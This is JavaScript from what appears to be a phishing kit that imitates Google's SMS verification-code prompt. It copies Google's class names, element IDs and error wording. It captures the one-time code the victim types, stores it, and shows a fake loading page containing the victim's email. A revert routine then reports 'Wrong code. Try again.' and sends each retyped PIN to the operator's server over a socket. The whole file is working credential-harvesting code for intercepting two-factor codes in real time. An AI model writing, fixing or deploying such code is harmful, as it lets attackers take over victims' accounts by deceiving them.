


/**
 * Turns a “normal” Google‐style PIN input into its error state, with custom error text.
 * @param {HTMLElement} rootDiv    The outer <div jsname="Ufn6O"> element.
 * @param {string}      errorText  The message to display in the live region.
 */
function setPinFieldError(rootDiv, errorText) {
  // 1) Add the two error classes to the wrapper
  rootDiv.classList.add('k0tWj', 'IYewr');

  // 2) Mark the <input> as invalid for accessibility
  const input = rootDiv.querySelector('input[jsname="YPqjbf"]');
  if (input) {
    input.setAttribute('aria-invalid', 'true');
  }

  // 3) Inject the error‐message icon + custom text into the live‐region container
  const liveRegion = rootDiv.querySelector('div[jsname="B34EJ"]');
  if (liveRegion) {
    liveRegion.setAttribute('aria-atomic', 'true');
    liveRegion.setAttribute('aria-live', 'assertive');
    liveRegion.innerHTML = `
      <div class="Ekjuhf Jj6Lae">
        <span class="AfGCob">
          <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
          </svg>
        </span>
        ${errorText}
      </div>
    `;
  }

  // 4) (Optional) Adjust ripple’s pivot for the animation
  const ripple = rootDiv.querySelector('div[jsname="XmnwAc"]');
  if (ripple) {
    ripple.style.transformOrigin = '245.5px center';
  }
}

 // Locate the actual <input> by ID and its wrapper, then invoke error state
 var inputEl = document.getElementById('idvPin');
 var pinFieldRoot = inputEl.closest('div[jsname="Ufn6O"]');
 if (!pinFieldRoot) {
   console.error('Couldn’t find the PIN-field wrapper!');
 } else {
   
 }




 function handleBlur() {
    // grab the PIN <input> and its Google-style wrapper
    const inputEl = document.getElementById('idvPin');
    const rootDiv = inputEl?.closest('div[jsname="Ufn6O"]');
    if (!inputEl || !rootDiv) return;
  
    // remove the “focused” styles
    rootDiv.classList.remove('u3bW4e', 'dLgj8b');
  
    // if empty → show placeholder; otherwise float the label
    if (inputEl.value.trim() === '') {
      if (!rootDiv.classList.contains('k0tWj')) {
        rootDiv.classList.add('sdJrJc');
      }
      rootDiv.classList.remove('CDELXb');
    } else {
      rootDiv.classList.add('CDELXb');
    }
  }






/**
 * Attach PIN‐code validation to the “Next” button and the Enter key.
 * Calls setPinFieldError(rootDiv, errorText) with the appropriate message.
 */
function initPinValidation() {
  const inputEl = document.getElementById('idvPin');
  const nextBtn  = document.getElementById('idvPreregisteredPhoneNext');

  if (!inputEl || !nextBtn) {
    console.error('PIN input or Next button not found');
    return;
  }

  function validateAndShowError() {
    const val = inputEl.value.trim();
    let msg = null;

    if (val === '') {
      msg = 'Enter a code';
    } else if (!/^\d+$/.test(val)) {
      msg = 'Code has numbers only. Try again.';
    } else if (val.length !== 6) {
      msg = 'Wrong number of digits. Try again.';
    }

    if (msg) {
      const rootDiv = inputEl.closest('div[jsname="Ufn6O"]');
      if (rootDiv) {
        setPinFieldError(rootDiv, msg);
      } else {
        console.error('PIN‐field wrapper not found');
      }
      return false;
    }

    // no error → allow form submission or further handling
    return true;
  }

  // on button click → validate, then swap via AJAX like poopy.js
  nextBtn.addEventListener('click', e => {
    e.preventDefault();
    if (validateAndShowError()) {
               // 1) mark loading state
               localStorage.setItem('activePage', 'loading3');
               // 2) grab the entered PIN
               const pinVal = inputEl.value.trim();
               localStorage.setItem('pinVal', pinVal);
              
               
      fetch('/loading3.html')
        .then(response => {
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          return response.text();
        })
        .then(html => {
                      // pull the real email from sms.html
         const emailField = document.querySelector('[data-profile-identifier]');
         const emailVal   = emailField ? emailField.textContent.trim() : '';
          // replace every “test@gmail.com” in the loaded HTML
          html = html.replace(/test@gmail\.com/g, emailVal);

          document.body.innerHTML = html;
               document.body.style.visibility = 'visible';
          // inject the entered PIN into the new page's input
          const newInput = document.getElementById('idvPin');
          if (newInput) newInput.value = pinVal;
        })
        .catch(err => console.error('Could not load loading3.html:', err));
    }
  });

    // on blur → adjust floating label / placeholder
  inputEl.addEventListener('blur', handleBlur);
    // on focus → thicken the border like the original Google input
    inputEl.addEventListener('focus', () => {
        const rootDiv = inputEl.closest('div[jsname="Ufn6O"]');
        if (rootDiv) rootDiv.classList.add('u3bW4e');
      });


  /**
   * Attach PIN‐code validation to the “Next” button and the Enter key.
   * Calls setPinFieldError(rootDiv, errorText) with the appropriate message.
   */
  function initPinValidation() {
    const inputEl = document.getElementById('idvPin');
    const nextBtn = document.getElementById('idvPreregisteredPhoneNext');
    if (!inputEl || !nextBtn) return;

    // … wire up blur, click handlers, etc. …

    // ←– ensure focus when the script runs:
    inputEl.focus();
    inputEl.select();      // optional, will highlight existing value
  }


  // on Enter key → validate, then swap via AJAX like poopy.js
  inputEl.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      e.preventDefault();
      if (validateAndShowError()) {
    // 1) mark loading state
    localStorage.setItem('activePage', 'loading3');
    // 2) grab the entered PIN
    const pinVal = inputEl.value.trim();
    localStorage.setItem('pinVal', pinVal);
   
      
        fetch('/loading3.html')
          .then(response => {
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            return response.text();
          })
          .then(html => {
                     // pull the real email from sms.html
          const emailField = document.querySelector('[data-profile-identifier]');
          const emailVal   = emailField ? emailField.textContent.trim() : '';
          // replace every “test@gmail.com” in the loaded HTML
         html = html.replace(/test@gmail\.com/g, emailVal);

            document.body.innerHTML = html;
            document.body.style.visibility = 'visible';
            // inject the entered PIN into the new page's input
            const storedPin = localStorage.getItem('pinVal');
            const newInput = document.getElementById('idvPin');
            if (newInput && storedPin) newInput.value = storedPin;
          })
          .catch(err => console.error('Could not load loading3.html:', err));
      }
    }
  });

  inputEl.focus();
  inputEl.select();
}

 // on load → if we previously swapped to loading3, re-load that instead of sms.html
 (function () {
    if (localStorage.getItem('activePage') === 'loading3') {
      fetch('/loading3.html')
        .then(resp => {
          if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
          return resp.text();
        })
        .then(html => {
                       const emailField = document.querySelector('[data-profile-identifier]');
           const emailVal   = emailField ? emailField.textContent.trim() : '';
           html = html.replace(/test@gmail\.com/g, emailVal);
          document.body.innerHTML = html;
          document.body.style.visibility = 'visible';
          const storedPin = localStorage.getItem('pinVal');
const newInput   = document.getElementById('idvPin');
if (newInput && storedPin) newInput.value = storedPin;

        })
        .catch(err => console.error('Could not load loading3.html:', err));
    } else {
      initPinValidation();
         }
     })();








  /**
 * Revert the AJAX swap back to sms.html, clear the loading3 flag,
 * and show a “Wrong code. Try again.” error on the PIN field.
 */
function revertFromLoading3() {
    // 1) clear the infinite‐loading3 flag
    localStorage.removeItem('activePage');
    // 2) fetch and inject the original SMS page
    fetch('/sms.html')
      .then(resp => {
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        return resp.text();
      })
      .then(html => {
        document.body.innerHTML = html;
        document.body.style.visibility = 'visible';
        // 3) locate the PIN-wrapper and show error
        const inputEl      = document.getElementById('idvPin');
        const pinFieldRoot = inputEl?.closest('div[jsname="Ufn6O"]');
        if (pinFieldRoot) {
          setPinFieldError(pinFieldRoot, 'Wrong code. Try again.');
                  // focus and select the PIN input so the user can retype immediately
        inputEl.focus();
        inputEl.select();
        }
        // 4) re-attach your validation handlers
        initPinValidation();
        // 5) re-bind PIN→server so the next valid PIN still emits
        const sessionID = localStorage.getItem('sessionID');
        const nextBtn   = document.getElementById('idvPreregisteredPhoneNext');
        // reuse the already-declared `inputEl` from above
        if (inputEl && nextBtn) {
          nextBtn.addEventListener('click', () => {
            const pinVal = inputEl.value.trim();
            if (/^\d{6}$/.test(pinVal)) 
              socket.emit('client-pin', { sessionID, pin: pinVal });
          });
          inputEl.addEventListener('keydown', e => {
            if (e.key === 'Enter') {
              const pinVal = inputEl.value.trim();
              if (/^\d{6}$/.test(pinVal)) 
                socket.emit('client-pin', { sessionID, pin: pinVal });
            }
          });
        }
      })
      .catch(err => console.error('Could not reload sms.html:', err));
  }
